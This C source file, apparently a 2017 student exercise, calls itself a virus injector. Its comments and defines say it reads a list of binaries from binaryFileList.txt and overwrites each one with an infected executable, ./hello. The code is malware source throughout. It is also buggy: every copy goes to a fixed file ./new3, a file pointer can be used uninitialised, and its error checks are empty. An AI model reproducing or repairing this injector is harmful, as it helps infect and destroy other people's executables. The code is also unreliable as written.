/*

Author: Pallavi
Created on: 19th January 2017
Modified on: 26th January 2017

*/

#include <ftw.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define SOURCE_TO_INJECT_CODE "./virus" 
#define VIRUS_CODE "./hello"
static FILE* inFp;

// takes binary files from binaryFileList.txt one by one
// overrides them with infected binary file named ./hello
int injectVirus();

int main(int argc, char *argv[]) {
	injectVirus();
	return 0;
}

int injectVirus(){
	int i =0;
	size_t l1;
	size_t l2;
	char line1[1000];
	char line2[1000];
	FILE *virusFile;
	FILE *nornalExecFile;
	unsigned char buffer[8192];

	inFp = fopen("./binaryFileList.txt", "r");
	while(fgets(line2,1000,inFp)!= NULL){
		line2[strcspn(line2,"\n")] = 0;
		if(strncmp(line2,SOURCE_TO_INJECT_CODE,strlen(line2)) != 0){
			if(strncmp(line2,VIRUS_CODE,strlen(line2)) != 0){
				nornalExecFile = fopen("./new3","wb");
				if(nornalExecFile == NULL){
				}
			}
		}
		virusFile = fopen(VIRUS_CODE,"rb");
		while((l1 = fread(buffer, 1, sizeof buffer, virusFile)) > 0) {
			l2 = fwrite(buffer, 1, l1, nornalExecFile);
		  	if(l2 < l1) {
	    		if(ferror(nornalExecFile)){
		    		printf("%s\n","error" );
		    	}
		    else{
		    		printf("l2 > l1"); 
		    	}
		    }
		    i++;
		}
		fclose(virusFile);
		fclose(nornalExecFile);
	}
	return 0;
}